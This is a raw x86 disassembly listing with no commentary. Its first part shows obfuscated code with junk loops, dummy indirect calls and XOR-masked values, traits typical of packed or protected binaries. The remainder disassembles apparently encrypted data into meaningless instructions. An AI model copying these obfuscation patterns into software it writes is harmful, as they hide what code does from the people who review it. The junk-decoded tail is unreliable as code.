  418a7e:	and    ebx,DWORD PTR ds:0x42a004
  418a84:	mov    DWORD PTR [ebp-0x58],edx
  418a87:	mov    edx,DWORD PTR [ebp+0x8]
  418a8a:	and    DWORD PTR ds:0x42b004,0x0
  418a94:	jmp    0x418aa6
  418a99:	mov    ebx,DWORD PTR ds:0x42b004
  418a9f:	inc    ebx
  418aa0:	mov    DWORD PTR ds:0x42b004,ebx
  418aa6:	cmp    DWORD PTR ds:0x42b004,0x1a
  418aad:	jae    0x418add
  418ab3:	cmp    DWORD PTR ds:0x42b004,0x1b
  418aba:	ja     0x418add
  418ac0:	jmp    0x418ad8
  418ac5:	push   0x87d9
  418aca:	push   DWORD PTR [ebp-0x10]
  418acd:	push   0x6435
  418ad2:	call   DWORD PTR ds:0x43004b
  418ad8:	jmp    0x418a99
  418add:	mov    ebx,DWORD PTR [ebp-0x54]
  418ae0:	sub    DWORD PTR ds:0x42c01c,0x42d010
  418aea:	add    edx,0x64f893
  418af0:	or     edx,ebx
  418af2:	and    ebx,DWORD PTR ds:0x429000
  418af8:	mov    DWORD PTR [ebp-0x54],edx
  418afb:	mov    edx,DWORD PTR [ebp+0x8]
  418afe:	xor    DWORD PTR ds:0x42a00c,ebx
  418b04:	mov    ebx,DWORD PTR [ebp-0x50]
  418b07:	add    DWORD PTR ds:0x42a00c,0x583e
  418b11:	add    edx,ecx
  418b13:	xor    DWORD PTR ds:0x42a000,0x5790
  418b1d:	xor    edx,ebx
  418b1f:	mov    DWORD PTR [ebp-0x50],edx
  418b22:	xor    ebx,0x79bd
  418b28:	mov    edx,DWORD PTR [ebp+0x8]
  418b2b:	adc    ebx,DWORD PTR ds:0x42d014
  418b31:	mov    ebx,DWORD PTR [ebp-0x4c]
  418b34:	adc    DWORD PTR ds:0x42d010,0xcea
  418b3e:	add    edx,edi
  418b40:	and    edx,ebx
  418b42:	mov    DWORD PTR [ebp-0x4c],edx
  418b45:	xor    edx,0x6e49
  418b4b:	mov    edx,DWORD PTR [ebp+0x8]
  418b4e:	mov    ebx,DWORD PTR [ebp-0x48]
  418b51:	xor    DWORD PTR ds:0x429008,0x656f
  418b5b:	lea    edx,[ebx+edx*1+0x241fcde]
  418b62:	mov    DWORD PTR [ebp-0x48],edx
  418b65:	and    ebx,edx
  418b67:	mov    edx,DWORD PTR [ebp+0x8]
  418b6a:	adc    DWORD PTR ds:0x42b000,edx
  418b70:	mov    ebx,0xfa5e1521
  418b75:	sub    ebx,edx
  418b77:	sub    edx,DWORD PTR ds:0x42901c
  418b7d:	add    ebx,DWORD PTR [ebp-0x44]
  418b80:	inc    DWORD PTR ds:0x42d014
  418b86:	mov    DWORD PTR [ebp-0x44],ebx
  418b89:	mov    edx,DWORD PTR [ebp+0x8]
  418b8c:	xor    edx,eax
  418b8e:	xor    DWORD PTR ds:0x429000,0x14c2
  418b98:	add    edx,esi
  418b9a:	jne    0x418971
  418ba0:	jmp    0x41d78a
  418ba5:	and    DWORD PTR ds:0x42d00c,0x0
  418baf:	xor    ebx,ebx
  418bb1:	xor    ebx,DWORD PTR ds:0x42d00c
  418bb7:	inc    ebx
  418bb8:	mov    DWORD PTR ds:0x42d00c,ebx
  418bbe:	cmp    DWORD PTR ds:0x42d00c,0x28
  418bc5:	jbe    0x418bed
  418bcb:	jmp    0x418be0
  418bd0:	push   0x42a004
  418bd5:	push   0x42f169
  418bda:	call   DWORD PTR ds:0x43000b
  418be0:	cmp    DWORD PTR ds:0x42d00c,0x18
  418be7:	jb     0x418baf
  418bed:	mov    edx,DWORD PTR [ebp-0xc]
  418bf0:	mov    ebx,DWORD PTR ds:0x429014
  418bf6:	sub    ebx,DWORD PTR ds:0x429018
  418bfc:	mov    DWORD PTR ds:0x429014,ebx
  418c02:	sub    edx,esi
  418c04:	and    DWORD PTR ds:0x42c000,0x0
  418c0e:	jmp    0x418c22
  418c13:	xor    ebx,ebx
  418c15:	add    ebx,DWORD PTR ds:0x42c000
  418c1b:	inc    ebx
  418c1c:	mov    DWORD PTR ds:0x42c000,ebx
  418c22:	cmp    DWORD PTR ds:0x42c000,0x15
  418c29:	jae    0x418c70
  418c2f:	cmp    DWORD PTR ds:0x42c000,0xc
  418c36:	jg     0x418c70
  418c3c:	jmp    0x418c51
  418c41:	push   0x42a00c
  418c46:	push   0x35fa
  418c4b:	call   DWORD PTR ds:0x43000f
  418c51:	cmp    DWORD PTR ds:0x42c000,0xb
  418c58:	jne    0x418c6b
  418c5e:	mov    ebx,DWORD PTR ds:0x42c000
  418c64:	inc    ebx
  418c65:	mov    DWORD PTR ds:0x42c000,ebx
  418c6b:	jmp    0x418c13
  418c70:	xor    edx,eax
  418c72:	dec    DWORD PTR ds:0x429028
  418c78:	mov    DWORD PTR [ebp-0x5c],edx
  418c7b:	sub    ebx,DWORD PTR ds:0x42d014
  418c81:	mov    edx,DWORD PTR [ebp-0x10]
  418c84:	or     ebx,DWORD PTR ds:0x42d004
  418c8a:	mov    ebx,DWORD PTR [ebp-0x8]
  418c8d:	xor    edx,eax
  418c8f:	xor    ebx,eax
  418c91:	sub    edx,ebx
  418c93:	xor    DWORD PTR ds:0x429008,0x42b01c
  418c9d:	sub    edx,esi
  418c9f:	and    DWORD PTR ds:0x42a010,0x70aa
  418ca9:	xor    edx,eax
  418cab:	mov    DWORD PTR ds:0x42b01c,0x72e9
  418cb5:	mov    DWORD PTR [ebp-0x10],edx
  418cb8:	mov    edx,DWORD PTR [ebp-0x14]
  418cbb:	mov    DWORD PTR [ebp+0x8],edx
  418cbe:	mov    DWORD PTR ds:0x42d00c,0x2349
  418cc8:	jmp    0x418ea8
  418ccd:	mov    edx,DWORD PTR [ebp+0x8]
  418cd0:	and    DWORD PTR ds:0x42b014,0x0
  418cda:	mov    ebx,DWORD PTR ds:0x42b014
  418ce0:	inc    ebx
  418ce1:	mov    DWORD PTR ds:0x42b014,ebx
  418ce7:	cmp    DWORD PTR ds:0x42b014,0x6
  418cee:	jle    0x418d26
  418cf4:	jmp    0x418cff
  418cf9:	call   DWORD PTR ds:0x430013
  418cff:	cmp    DWORD PTR ds:0x42b014,0x5
  418d06:	jne    0x418d19
  418d0c:	mov    ebx,DWORD PTR ds:0x42b014
  418d12:	inc    ebx
  418d13:	mov    DWORD PTR ds:0x42b014,ebx
  418d19:	cmp    DWORD PTR ds:0x42b014,0x10
  418d20:	jb     0x418cda
  418d26:	mov    ebx,DWORD PTR [ebp-0x8]
  418d29:	adc    DWORD PTR ds:0x429010,0x42d018
  418d33:	xor    edx,eax
  418d35:	and    DWORD PTR ds:0x42d00c,0x4b9
  418d3f:	xor    ebx,eax
  418d41:	and    DWORD PTR ds:0x429004,0x114f
  418d4b:	sub    edx,ebx
  418d4d:	sub    edx,esi
  418d4f:	and    DWORD PTR ds:0x42d008,0x0
  418d59:	jmp    0x418d6b
  418d5e:	mov    ebx,DWORD PTR ds:0x42d008
  418d64:	inc    ebx
  418d65:	mov    DWORD PTR ds:0x42d008,ebx
  418d6b:	cmp    DWORD PTR ds:0x42d008,0x1b
  418d72:	jae    0x418da0
  418d78:	cmp    DWORD PTR ds:0x42d008,0x22
  418d7f:	jg     0x418da0
  418d85:	jmp    0x418d9b
  418d8a:	push   0x42f107
  418d8f:	push   DWORD PTR [ebp-0x10]
  418d92:	push   DWORD PTR [ebp-0x24]
  418d95:	call   DWORD PTR ds:0x430017
  418d9b:	jmp    0x418d5e
  418da0:	xor    edx,eax
  418da2:	or     DWORD PTR ds:0x429008,ecx
  418da8:	mov    DWORD PTR [ebp+0x8],edx
  418dab:	mov    edx,DWORD PTR [ebp+0x8]
  418dae:	mov    ebx,DWORD PTR [ebp-0x58]
  418db1:	sub    DWORD PTR ds:0x429020,0x34c1
  418dbb:	add    edx,0x5708f1
  418dc1:	add    DWORD PTR ds:0x42a000,0x6667
  418dcb:	imul   edx,ebx
  418dce:	movzx  ebx,BYTE PTR ds:0x42b018
  418dd5:	or     DWORD PTR ds:0x42d004,ebx
  418ddb:	mov    DWORD PTR [ebp-0x58],edx
  418dde:	mov    edx,DWORD PTR [ebp+0x8]
  418de1:	sub    DWORD PTR ds:0x429018,0x429014
  418deb:	mov    ebx,DWORD PTR [ebp-0x54]
  418dee:	xor    DWORD PTR ds:0x42d018,0x42a00c
  418df8:	add    edx,0x64f893
  418dfe:	or     edx,ebx
  418e00:	adc    DWORD PTR ds:0x42901c,ecx
  418e06:	mov    DWORD PTR [ebp-0x54],edx
  418e09:	and    DWORD PTR ds:0x42d008,0x0
  418e13:	jmp    0x418e25
  418e18:	mov    ebx,DWORD PTR ds:0x42d008
  418e1e:	inc    ebx
  418e1f:	mov    DWORD PTR ds:0x42d008,ebx
  418e25:	cmp    DWORD PTR ds:0x42d008,0x13
  418e2c:	jae    0x418e6e
  418e32:	cmp    DWORD PTR ds:0x42d008,0x22
  418e39:	jb     0x418e6e
  418e3f:	jmp    0x418e69
  418e44:	push   0x30b6
  418e49:	push   0x7ba0
  418e4e:	push   0x429014
  418e53:	push   0x2a48
  418e58:	push   DWORD PTR [ebp-0x10]
  418e5b:	push   0x4d58
  418e60:	push   DWORD PTR [ebp-0xc]
  418e63:	call   DWORD PTR ds:0x43001b
  418e69:	jmp    0x418e18
  418e6e:	mov    edx,DWORD PTR [ebp+0x8]
  418e71:	mov    ebx,DWORD PTR [ebp-0x50]
  418e74:	add    edx,ecx
  418e76:	xor    edx,ebx
  418e78:	mov    DWORD PTR [ebp-0x50],edx
  418e7b:	mov    edx,DWORD PTR [ebp+0x8]
  418e7e:	mov    ebx,DWORD PTR [ebp-0x4c]
  418e81:	add    edx,edi
  418e83:	and    edx,ebx
  418e85:	mov    DWORD PTR [ebp-0x4c],edx
  418e88:	mov    edx,DWORD PTR [ebp+0x8]
  418e8b:	mov    ebx,DWORD PTR [ebp-0x48]
  418e8e:	lea    edx,[ebx+edx*1+0x241fcde]
  418e95:	mov    DWORD PTR [ebp-0x48],edx
  418e98:	mov    edx,DWORD PTR [ebp+0x8]
  418e9b:	mov    ebx,0xfa5e1521
  418ea0:	sub    ebx,edx
  418ea2:	add    ebx,DWORD PTR [ebp-0x44]
  418ea5:	mov    DWORD PTR [ebp-0x44],ebx
  418ea8:	mov    edx,DWORD PTR [ebp+0x8]
  418eab:	xor    edx,eax
  418ead:	add    edx,esi
  418eaf:	jne    0x418ccd
  418eb5:	mov    edx,DWORD PTR [ebp-0xc]
  418eb8:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  418ebf:	mov    bl,BYTE PTR [ebp-0x1]
  418ec2:	cmp    dl,bl
  418ec4:	je     0x41b305
  418eca:	mov    ecx,DWORD PTR [ebp-0x5c]
  418ecd:	mov    edx,DWORD PTR [ebp-0xc]
  418ed0:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  418ed7:	mov    ebx,DWORD PTR [ebp+0xc]
  418eda:	xor    ecx,eax
  418edc:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272ec]
  418ee3:	jne    0x41d79c
  418ee9:	mov    ecx,DWORD PTR [ebp-0x5c]
  418eec:	mov    edx,DWORD PTR [ebp+0xc]
  418eef:	xor    ecx,eax
  418ef1:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272ec]
  418ef9:	mov    edx,DWORD PTR [ebp-0x18]
  418efc:	xor    edx,eax
  418efe:	add    edx,esi
  418f00:	cmp    ecx,edx
  418f02:	mov    ecx,DWORD PTR [ebp-0x14]
  418f05:	mov    DWORD PTR [ebp+0x8],ecx
  418f08:	mov    ecx,DWORD PTR [ebp+0x8]
  418f0b:	je     0x421f6a
  418f11:	xor    ecx,eax
  418f13:	add    ecx,esi
  418f15:	mov    ecx,0x242ebcc
  418f1a:	je     0x41d6f0
  418f20:	mov    edx,DWORD PTR [ebp+0x8]
  418f23:	mov    ebx,DWORD PTR [ebp-0x8]
  418f26:	xor    edx,eax
  418f28:	xor    ebx,eax
  418f2a:	sub    edx,ebx
  418f2c:	sub    edx,esi
  418f2e:	xor    edx,eax
  418f30:	mov    DWORD PTR [ebp+0x8],edx
  418f33:	mov    edx,DWORD PTR [ebp+0x8]
  418f36:	mov    ebx,DWORD PTR [ebp-0x58]
  418f39:	add    edx,0x5708f1
  418f3f:	imul   edx,ebx
  418f42:	mov    DWORD PTR [ebp-0x58],edx
  418f45:	mov    edx,DWORD PTR [ebp+0x8]
  418f48:	mov    ebx,DWORD PTR [ebp-0x54]
  418f4b:	add    edx,0x64f893
  418f51:	or     edx,ebx
  418f53:	mov    DWORD PTR [ebp-0x54],edx
  418f56:	mov    edx,DWORD PTR [ebp+0x8]
  418f59:	mov    ebx,DWORD PTR [ebp-0x50]
  418f5c:	add    edx,ecx
  418f5e:	jmp    0x41b2c1
  418f63:	stos   BYTE PTR es:[edi],al
  418f64:	fsubr  QWORD PTR [ebx-0x14]
  418f67:	sti    
  418f68:	mov    ebx,0xc4df9c99
  418f6d:	add    DWORD PTR [ecx+0x2d],esi
  418f70:	(bad)  
  418f71:	iret   
  418f72:	retf   0x1d11
  418f75:	jge    0x418ff1
  418f77:	xor    BYTE PTR [edi+0x7a],bl
  418f7a:	jp     0x418fc3
  418f7c:	jp     0x418f4f
  418f7e:	jmp    0xbf6e4090
  418f83:	ret    
  418f84:	je     0x418fba
  418f86:	push   ds
  418f87:	popa   
  418f88:	or     al,bl
  418f8a:	je     0x418ff2
  418f8c:	pop    esi
  418f8d:	mov    edx,0xbb190757
  418f92:	and    dl,dl
  418f94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f95:	mov    al,ds:0x3dd5326d
  418f9a:	and    DWORD PTR ds:0xf0879c82,edi
  418fa0:	aaa    
  418fa1:	aad    0x9
  418fa3:	pop    eax
  418fa4:	fist   DWORD PTR [ebp-0x2da0dd2b]
  418faa:	outs   dx,BYTE PTR ds:[esi]
  418fab:	add    dl,BYTE PTR [ebp+0x48b51de6]
  418fb1:	mov    edx,0xca6b40d2
  418fb6:	push   ebx
  418fb7:	cli    
  418fb8:	dec    ebx
  418fb9:	dec    edx
  418fba:	(bad)  
  418fbb:	and    BYTE PTR [esi+ebp*2-0x53],dl
  418fbf:	(bad)  
  418fc0:	dec    edx
  418fc1:	(bad)  
  418fc3:	pop    ebp
  418fc4:	push   ebx
  418fc5:	ret    0x6a08
  418fc8:	cs cmc 
  418fca:	push   ecx
  418fcb:	dec    ebp
  418fcc:	pusha  
  418fcd:	pop    edi
  418fce:	jge    0x418f75
  418fd0:	push   esp
  418fd1:	cmp    al,BYTE PTR [eax+0xf]
  418fd4:	jl     0x41904a
  418fd6:	and    cl,ch
  418fd8:	hlt    
  418fd9:	(bad)  
  418fda:	fsub   QWORD PTR [edi+0x5a338f6d]
  418fe0:	xchg   bp,ax
  418fe2:	push   ebp
  418fe3:	fiadd  DWORD PTR [ecx*4-0x31a47645]
  418fea:	daa    
  418feb:	(bad)  
  418fec:	daa    
  418fed:	push   eax
  418fee:	jae    0x418f7c
  418ff0:	cmp    DWORD PTR [eax-0x34],ebx
  418ff3:	xchg   DWORD PTR [esp+edx*4+0x74],edx
  418ff7:	mov    esi,0xd5e342b7
  418ffc:	push   ss
  418ffd:	(bad)  
  418ffe:	and    DWORD PTR [edi-0x36c856b3],edx
  419004:	div    DWORD PTR [esi-0x3f8ca770]
  41900a:	mov    al,BYTE PTR [edi]
  41900c:	push   ebp
  41900d:	xchg   edx,eax
  41900e:	push   edi
  41900f:	add    eax,0x97b3bced
  419014:	retf   
  419015:	push   0xa5b8f89e
  41901a:	sbb    DWORD PTR [eax+0x34],ebx
  41901d:	cmc    
  41901e:	aaa    
  41901f:	ret    
  419020:	push   esp
  419021:	js     0x418ffb
  419023:	xchg   ecx,eax
  419024:	xor    al,BYTE PTR [eax+eiz*2-0x75]
  419028:	(bad)  
  419029:	scas   eax,DWORD PTR es:[edi]
  41902a:	mov    BYTE PTR [esi-0x73],al
  41902d:	js     0x41906f
  41902f:	cld    
  419030:	pop    esi
  419031:	pop    es
  419032:	cmc    
  419033:	push   ecx
  419034:	or     DWORD PTR [ebp-0x3d7a4de9],0xa290e547
  41903e:	pop    esi
  41903f:	adc    eax,0xd5bec35f
  419044:	fs in  al,0xa7
  419047:	pop    ebp
  419048:	pop    edi
  419049:	gs ret 
  41904b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41904c:	lahf   
  41904d:	fiadd  DWORD PTR [ecx+0xf]
  419050:	sahf   
  419051:	inc    esp
  419052:	xchg   edi,eax
  419053:	sub    bl,0x28
  419056:	ins    DWORD PTR es:[edi],dx
  419057:	add    DWORD PTR [ecx-0x6a2c022d],edi
  41905d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41905e:	adc    eax,0xe47bada1
  419063:	dec    eax
  419064:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419065:	stc    
  419066:	leave  
  419067:	outs   dx,DWORD PTR ds:[esi]
  419068:	and    BYTE PTR [eax+0x54],0x42
  41906c:	jbe    0x419046
  41906e:	jmp    0x4190d5
  419070:	sub    eax,DWORD PTR [ebp-0x13]
  419073:	mov    BYTE PTR [edx],ch
  419075:	out    0x39,al
  419077:	jne    0x419038
  419079:	lock cmp BYTE PTR [esi-0x20c81c0b],ch
  419080:	stos   DWORD PTR es:[edi],eax
  419081:	repnz sub cl,ah
  419084:	jmp    0x467d:0x69fdf00a
  41908b:	js     0x419038
  41908d:	shr    BYTE PTR [ecx-0x368f7acb],cl
  419093:	push   ecx
  419094:	out    dx,eax
  419095:	xor    BYTE PTR [ebx-0x3c5b99d9],bl
  41909b:	mov    ebx,gs
  41909d:	jmp    0xb704f37c
  4190a2:	test   DWORD PTR [ecx+0x6c],edx
  4190a5:	pushf  
  4190a6:	dec    ebp
  4190a7:	out    0x34,al
  4190a9:	jnp    0x419118
  4190ab:	mov    edi,0xe5acf2da
  4190b0:	add    bh,bh
  4190b2:	mov    al,BYTE PTR [esi+0x167c05f6]
  4190b8:	test   edi,0x580ff4e9
  4190be:	add    BYTE PTR [esi],al
  4190c0:	fldenv [edx]
  4190c2:	out    0x45,al
  4190c4:	(bad)  
  4190c5:	cmp    eax,0x5a347e9
  4190ca:	repz hlt 
  4190cc:	and    eax,0xc3c1f8d
  4190d1:	mov    edx,DWORD PTR [edi-0x66]
  4190d4:	pop    es
  4190d5:	icebp  
  4190d6:	test   eax,0xa13df19b
  4190db:	jmp    0x87167265
  4190e0:	retf   0x4f30
  4190e3:	mov    bl,0x6e
  4190e5:	push   ss
  4190e6:	add    eax,0xf53f867e
  4190eb:	push   ss
  4190ec:	xchg   esp,eax
  4190ed:	dec    ecx
  4190ee:	add    esi,DWORD PTR [edx+eax*8]
  4190f1:	push   ebx
  4190f2:	inc    esp
  4190f3:	test   eax,0x5025426
  4190f8:	sub    dh,BYTE PTR [ebx+0x1e916c86]
  4190fe:	ss dec esp
  419100:	or     eax,0xe7a7446
  419105:	mov    cl,0xa8
  419107:	aaa    
  419108:	adc    ch,al
  41910a:	mov    ds:0x66042f8c,al
  41910f:	xor    cl,BYTE PTR [edi+0x34c02bc2]
  419115:	cmp    al,0xe3
  419117:	mov    ?,WORD PTR [edx]
  419119:	fild   QWORD PTR [ebx]
  41911b:	imul   edx,esi,0xdc87e77d
  419121:	push   ebx
  419122:	mov    WORD PTR [edi-0x72],ds
  419125:	out    0xe7,al
  419127:	ins    DWORD PTR es:[edi],dx
  419128:	retf   
  419129:	sub    cl,bh
  41912b:	adc    DWORD PTR [esi],ecx
  41912d:	sar    BYTE PTR [esi+0x287af9dc],cl
  419133:	imul   esi,edx,0xffffffa8
  419136:	aad    0xd6
  419138:	adc    eax,DWORD PTR [ebx-0x33]
  41913b:	or     BYTE PTR [ecx+0x11],0x7f
  41913f:	cmp    BYTE PTR [edx+0x12f891ab],bh
  419145:	pop    edx
  419146:	mov    edi,0xe90e3547
  41914b:	and    ecx,DWORD PTR [edi+edi*1+0x24]
  41914f:	je     0x419117
  419151:	mov    esi,DWORD PTR [ebp-0x3b]
  419154:	aas    
  419155:	out    0xba,al
  419157:	push   edx
  419158:	push   esi
  419159:	inc    edi
  41915a:	jg     0x419110
  41915c:	mov    edx,0xc2d56e6b
  419161:	mov    esp,0xdebd73fd
  419166:	cmp    al,0x80
  419168:	cmp    ah,BYTE PTR [ebx-0x8]
  41916b:	jnp    0x41912c
  41916d:	cmp    al,0xd8
  41916f:	adc    BYTE PTR [ecx],al
  419171:	mov    ch,0x70
  419173:	sti    
  419174:	pusha  
  419175:	fist   WORD PTR [esp+ecx*1+0x5d]
  419179:	add    eax,0xc769c18
  41917e:	ja     0x419180
  419180:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419181:	xor    DWORD PTR [edi],esp
  419183:	mov    bl,BYTE PTR [ebx+0x11071c0c]
  419189:	adc    ecx,DWORD PTR [edx-0x7b]
  41918c:	or     al,0xa2
  41918e:	push   ss
  41918f:	stos   DWORD PTR es:[edi],eax
  419190:	(bad)  
  419191:	fsub   QWORD PTR [edx+eax*4+0xb08a32d]
  419198:	add    esp,ebp
  41919a:	outs   dx,BYTE PTR ds:[esi]
  41919b:	or     eax,0xa41515e1
  4191a0:	fcmovu st,st(6)
  4191a2:	xor    dl,0xcb
  4191a5:	mov    ebp,0xbe92b35b
  4191aa:	xor    eax,DWORD PTR [edi+0x51]
  4191ad:	pop    ecx
  4191ae:	jle    0x4191a5
  4191b0:	or     bl,BYTE PTR [esi]
  4191b2:	retf   0xe32b
  4191b5:	mov    dh,0xa7
  4191b7:	sbb    ax,0x7b8e
  4191bb:	dec    ebx
  4191bc:	pop    ebp
  4191bd:	imul   BYTE PTR [ebx-0x42694d4b]
  4191c3:	push   0xa6858fd6
  4191c8:	jle    0x419155
  4191ca:	and    BYTE PTR [edx-0x63],bh
  4191cd:	jmp    0xbdc:0xbf300fb0
  4191d4:	iret   
  4191d5:	dec    esp
  4191d6:	fcmovb st,st(0)
  4191d8:	js     0x41918d
  4191da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4191db:	jge    0x419214
  4191dd:	int3   
  4191de:	push   ss
  4191df:	aam    0x36
  4191e1:	fsub   st,st(6)
  4191e3:	xchg   ebx,eax
  4191e4:	dec    edx
  4191e5:	je     0x4191fe
  4191e7:	(bad)  
  4191e8:	xchg   BYTE PTR [edi+0x7884be13],al
  4191ee:	push   ebx
  4191ef:	add    edx,DWORD PTR [ebp+0x63]
  4191f2:	je     0x419252
  4191f4:	verr   WORD PTR ds:0x7af0d047
  4191fb:	pop    es
  4191fc:	stc    
  4191fd:	inc    ebx
  4191fe:	popf   
  4191ff:	xor    DWORD PTR [ebp-0x59fcf567],edi
  419205:	loop   0x419276
  419207:	into   
  419208:	inc    ebx
  419209:	scas   eax,DWORD PTR es:[edi]
  41920a:	lods   eax,DWORD PTR ds:[esi]
  41920b:	push   ss
  41920c:	test   DWORD PTR [eax+0xfb733ba],edi
  419212:	xchg   edx,eax
  419213:	mov    edx,0x98c63011
  419218:	test   dh,dl
  41921a:	mov    edx,ecx
  41921c:	mov    eax,ds:0x913a271e
  419221:	out    dx,eax
  419222:	jg     0x419236
  419224:	mov    ch,0x88
  419226:	cli    
  419227:	add    BYTE PTR [ebp+0x15],ah
  41922a:	dec    esi
  41922b:	leave  
  41922c:	and    al,0x37
  41922e:	xchg   esp,eax
  41922f:	jb     0x4191c6
  419231:	mov    ecx,0x6f899a43
  419236:	je     0x419282
  419238:	enter  0xecbc,0x2b
  41923c:	ret    
  41923d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41923e:	sbb    esi,DWORD PTR [esi]
  419240:	retf   0xefeb
  419243:	ds pop esi
  419245:	sub    ecx,eax
  419247:	mov    ds:0xe39d12f1,al
  41924c:	add    edi,DWORD PTR [edi+edx*4-0x11]
  419250:	pop    ecx
  419251:	mov    ecx,0xfa3bcaf1
  419256:	inc    ecx
  419257:	xor    al,0x49
  419259:	test   edx,0xdda5c080
  41925f:	jge    0x4192aa
  419261:	sub    eax,0x5e560fd9
  419266:	adc    DWORD PTR [ebx+eiz*1+0x7225f67],esp
  41926d:	jae    0x4192c9
  41926f:	(bad)  
  419270:	sbb    edi,0xd29d90f7
  419276:	adc    esi,DWORD PTR [eiz*4+0x5fd7abd2]
  41927d:	arpl   si,bp
  41927f:	adc    al,0x21
  419281:	push   ss
  419282:	dec    esp
  419283:	xchg   ebx,eax
  419284:	add    al,0x24
  419286:	adc    DWORD PTR [esi+0x3f46e978],ecx
  41928c:	stos   DWORD PTR es:[edi],eax
  41928d:	pop    ds
  41928e:	out    dx,al
  41928f:	fs cmc 
  419291:	fsub   DWORD PTR [ebx-0x26c09f0b]
  419297:	lds    eax,FWORD PTR [ebx+ebp*2]
  41929a:	mov    bh,0x11
  41929c:	(bad)  
  41929d:	xchg   esi,eax
  41929e:	sar    BYTE PTR [ebx+0x3c],cl
  4192a1:	(bad)  
  4192a2:	in     al,0xc2
  4192a4:	adc    bl,BYTE PTR ds:0x6cba6815
  4192aa:	ret    0xd211
  4192ad:	sub    ah,BYTE PTR [ebx]
  4192af:	into   
  4192b0:	mov    ds:0x9541f0ff,al
  4192b5:	and    eax,0x8de67e7a
  4192ba:	das    
  4192bb:	sbb    eax,ecx
  4192bd:	sbb    eax,0x90cea7c9
  4192c2:	outs   dx,DWORD PTR ds:[esi]
  4192c3:	jle    0x4192cf
  4192c5:	out    dx,al
  4192c6:	clc    
  4192c7:	push   ecx
  4192c8:	mov    ecx,0xd544d3e7
  4192cd:	cld    
  4192ce:	or     eax,0xc5ae679a
  4192d3:	movq   mm3,QWORD PTR [edi-0x63]
  4192d7:	sub    edx,DWORD PTR [ecx]
  4192d9:	dec    ecx
  4192da:	xchg   BYTE PTR [edx+eax*4+0x475e6a26],bl
  4192e1:	popa   
  4192e2:	xor    BYTE PTR ds:0x9171a2f6,ch
  4192e8:	jns    0x4192c4
  4192ea:	xchg   ecx,eax
  4192eb:	hlt    
  4192ec:	pop    ds
  4192ed:	adc    ch,bl
  4192ef:	stc    
  4192f0:	ja     0x4192d4
  4192f2:	bound  ebx,QWORD PTR [esp-0x38]
  4192f6:	pop    esi
  4192f7:	popf   
  4192f8:	hlt    
  4192f9:	in     eax,dx
  4192fa:	pushf  
  4192fb:	jmp    0xed81157c
  419300:	adc    DWORD PTR [edx],edi
  419302:	pop    eax
  419303:	sub    DWORD PTR [esi],eax
  419305:	mov    al,0xe0
  419307:	push   ebx
  419308:	inc    eax
  419309:	cmc    
  41930a:	aad    0x77
  41930c:	into   
  41930d:	xor    al,0xcd
  41930f:	mov    bl,0x6a
  419311:	pushf  
  419312:	xor    edi,DWORD PTR [edi-0x9]
  419315:	xchg   edi,eax
  419316:	outs   dx,BYTE PTR ds:[esi]
  419317:	sahf   
  419318:	ja     0x419380
  41931a:	jnp    0x4192a6
  41931c:	jb     0x4192cf
  41931e:	imul   edx,esi,0x73d9f098
  419324:	adc    al,BYTE PTR [edi]
  419326:	cmp    dl,0xf
  419329:	xor    DWORD PTR [eax-0x32],ebp
  41932c:	mov    ecx,0xa0820b90
  419331:	mov    ah,0xcd
  419333:	shl    BYTE PTR [esi],1
  419335:	jle    0x4192c7
  419337:	pop    esp
  419338:	dec    ebx
  419339:	mov    al,ds:0xd51bc4f4
  41933e:	jmp    0x419373
  419340:	push   edx
  419341:	sub    al,0x88
  419343:	das    
  419344:	je     0x4192f0
  419346:	add    al,0x7c
  419348:	mov    ?,WORD PTR [edi+0x1bfd8106]
  41934e:	sahf   
  41934f:	imul   edi,DWORD PTR [edx],0x3e4da48f
  419355:	adc    BYTE PTR [edi+0x7d],0xe5
  419359:	call   0x2258b8f2
  41935e:	(bad)  
  41935f:	scas   al,BYTE PTR es:[edi]
  419360:	add    BYTE PTR [eax+0x2c9f4388],0xd0
  419367:	pop    eax
  419368:	or     eax,0xacc1c057
  41936d:	and    DWORD PTR [ebx],0xffffffa3
  419370:	out    dx,al
  419371:	pusha  
  419372:	sti    
  419373:	outs   dx,BYTE PTR ds:[esi]
  419374:	out    dx,eax
  419375:	popf   
  419376:	out    0xe8,eax
  419378:	cmp    eax,0xac1f6a66
  41937d:	in     al,0x28
  41937f:	adc    BYTE PTR [ecx-0x24],bh
  419382:	cwde   
  419383:	mov    ecx,0xe85f221a
  419388:	cs jmp 0x41936c
  41938b:	sub    DWORD PTR [ebx+0x5a],0x4ef42df9
  419392:	push   0xffffff80
  419394:	jmp    0x41932f
  419396:	in     eax,dx
  419397:	add    al,0x93
  419399:	and    eax,ebx
  41939b:	sub    BYTE PTR [edi-0x5a],ah
  41939e:	stos   BYTE PTR es:[edi],al
  41939f:	bound  edi,QWORD PTR [ebp-0xb720c9c]
  4193a5:	in     eax,0xf2
  4193a7:	mov    ebp,0x89fecabe
  4193ac:	ins    DWORD PTR es:[edi],dx
  4193ad:	add    eax,0x1b6e2dbe
  4193b2:	sbb    eax,edx
  4193b4:	(bad)  [esp+eax*1]
  4193b7:	fidiv  DWORD PTR [esi]
  4193b9:	adc    esi,edx
  4193bb:	jbe    0x419419
  4193bd:	push   ss
  4193be:	jbe    0x4193db
  4193c0:	cmp    al,0x61
  4193c2:	fisubr DWORD PTR [esi+0xb]
  4193c5:	and    al,0xe2
  4193c7:	push   es
  4193c8:	xchg   ecx,eax
  4193c9:	push   es
  4193ca:	inc    ch
  4193cc:	push   edi
  4193cd:	(bad)  
  4193cf:	dec    edx
  4193d0:	(bad)  
  4193d1:	pop    edi
  4193d2:	jae    0x4193e7
  4193d4:	adc    BYTE PTR [edx-0x16],cl
  4193d7:	pushf  
  4193d8:	aas    
  4193d9:	xor    ebx,DWORD PTR [eax]
  4193db:	sbb    eax,0x2925deab
  4193e0:	xor    DWORD PTR [esi-0x223b62e5],0xa1549fa9
